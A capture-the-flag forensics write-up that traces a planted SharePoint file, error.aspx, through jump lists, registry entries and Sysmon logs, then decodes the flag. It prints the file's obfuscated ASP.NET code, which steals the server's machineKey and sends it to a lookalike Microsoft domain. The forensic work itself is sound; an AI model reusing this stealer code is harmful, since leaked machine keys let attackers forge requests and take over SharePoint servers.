# PointBreak

Extract the zip and use `ewfmount` + `losetup` to mount the NTFS under Linux.

Discover suspicious files:

```shell
$ strings -e l Users/*/Recent/AutomaticDestinations/*
C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\error.aspx
```

Suggested by @Crazyman on Discord, you can also use [JLECmd](https://ericzimmerman.github.io/#!index.md):

```shell
$ wine JLECmd/JLECmd.exe -f /mnt/Users/spfarm/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/9b9cdc69c1c24e2b.automaticDestinations-ms
--- DestList entries ---
Entry #: 1
  MRU: 0
  Path: C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\error.aspx
  Pinned: False
  Created on:    2025-11-09 02:01:53
  Last modified: 2025-11-09 02:29:54
  Hostname: sp-srv01
  Mac Address: f7:36:3e:db:0b:7c
  Interaction count: 1
```

@Leviii from Discord suggests to find clues in registry `Users\spfarm\NTUSER.DAT`:

```registry
[\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.aspx]
"0"=hex(3):65,00,72,00,72,00,6f,00,72,00,2e,00,61,00,73,00,70,00,78,00,00,00,6c,00,32,00,00,00,00,00,00,00,00,00,00,00,65,72,72,6f,72,2e,61,73,70,78,2e,6c,6e,6b,00,00,4e,00,09,00,04,00,ef,be,00,00,00,00,00,00,00,00,2e,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,65,00,72,00,72,00,6f,00,72,00,2e,00,61,00,73,00,70,00,78,00,2e,00,6c,00,6e,00,6b,00,00,00,1e,00,00,00
"MRUListEx"=hex(3):00,00,00,00,ff,ff,ff,ff
```

```python
>>> bytes.fromhex("65,00,72,00,72,00,6f,00,72,00,2e,00,61,00,73,00,70,00,78,00,00,00,6c,00,32,00,00,00,00,00,00,00,00,00,00,00,65,72\
,72,6f,72,2e,61,73,70,78,2e,6c,6e,6b,00,00,4e,00,09,00,04,00,ef,be,00,00,00,00,00,00,00,00,2e,00,00,00,00,00,00,00,00,00,00,00,00,00\
,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,65,00,72,00,72,00,6f,00,72,00,2e,00,61,00,73,00,70,00,78,00,2e,00,6c,00,6e,00,6b,00\
,00,00,1e,00,00,00".replace(",",""))[:20].decode('utf-16le')
'error.aspx'
```

Alternatively, dump `Microsoft-Windows-Sysmon%4Operational.evtx` using `evtx_dump` leads to:

```json
"CommandLine": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Program Files\\Common Files\\microsoft shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\error.aspx",
```

In `Program\ Files/Common\ Files/microsoft\ shared/Web\ Server\ Extensions/16/TEMPLATE/LAYOUTS/error.aspx`:

```asp
}<% try{int _=0;while(_<1){switch(_){case 0:System.Net.ServicePointManager.DnsRefreshTimeout=0;var __=((System.Web.Configuration.MachineKeySection)System.Web.Configuration.WebConfigurationManager.OpenWebConfiguration(System.Text.Encoding.UTF8.GetString(new byte[]{126})).GetSection(System.Text.Encoding.UTF8.GetString(new byte[]{115,121,115,116,101,109,46,119,101,98,47,109,97,99,104,105,110,101,75,101,121})));var ___=__.ValidationKey+System.Text.Encoding.UTF8.GetString(new byte[]{124})+__.DecryptionKey+System.Text.Encoding.UTF8.GetString(new byte[]{124})+__.CompatibilityMode.ToString();System.Net.Dns.GetHostEntry(System.Text.Encoding.UTF8.GetString(new byte[]{115,104,97,114,101,112,111,105,110,116,45,115,101,114,118,105,99,101,115,46,109,105,99,114,111,115,111,102,116,111,110,108,108,105,110,101,46,99,111,109}));var ____=new System.Net.WebClient();____.Headers[System.Text.Encoding.UTF8.GetString(new byte[]{85,115,101,114,45,65,103,101,110,116})]=System.Text.Encoding.UTF8.GetString(new byte[]{77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,49,48,46,48,59,32,87,105,110,54,52,59,32,120,54,52,41});____.UploadString(System.Text.Encoding.UTF8.GetString(new byte[]{104,116,116,112,58,47,47})+System.Text.Encoding.UTF8.GetString(new byte[]{115,104,97,114,101,112,111,105,110,116,45,115,101,114,118,105,99,101,115,46,109,105,99,114,111,115,111,102,116,111,110,108,108,105,110,101,46,99,111,109})+System.Text.Encoding.UTF8.GetString(new byte[]{47})+System.Text.Encoding.UTF8.GetString(new byte[]{66,72,70,108,97,103,89,123,99,98,98,51,98,53,101,53,53,49,99,51,53,55,55,97,53,57,53,56,56,97,97,50,99,57,56,102,52,48,51,97,125})+System.Text.Encoding.UTF8.GetString(new byte[]{47})+System.Text.Encoding.UTF8.GetString(new byte[]{109,97,99,104,105,110,101,75,101,121}),System.Text.Encoding.UTF8.GetString(new byte[]{80,79,83,84}),___);_++;break;default:_=999;break;}}}catch{}%>
```

Which is abnormal. Convert all the byte array to string, the flag is hidden within:

```python
>>> bytes([66,72,70,108,97,103,89,123,99,98,98,51,98,53,101,53,53,49,99,51,53,55,55,97,53,57,53,56,56,97,97,50,99,57,56,102,52,48,51\
,97,125])
b'BHFlagY{cbb3b5e551c3577a59588aa2c98f403a}'
```
